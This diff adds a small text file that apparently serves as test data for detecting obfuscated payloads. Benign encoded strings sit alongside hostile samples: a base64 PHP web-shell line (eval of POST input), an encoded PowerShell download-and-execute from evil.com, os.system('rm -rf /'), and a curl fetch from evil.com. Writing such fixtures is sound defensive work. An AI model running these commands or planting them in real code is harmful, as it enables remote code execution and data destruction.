@@ -1,0 +1,17 @@
+This is a normal line.
+
+SGVsbG8gV29ybGQ=
+
+ZXZhbCgkX1BPU1RbJ2NtZCddKTs=
+
+48656c6c6f20576f726c64
+
+\x65\x76\x61\x6c\x28\x22\x74\x65\x73\x74\x22\x29
+
+powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
+
+Random text again.
+
+os.system("rm -rf /")
+
+curl http://evil.com/file.sh
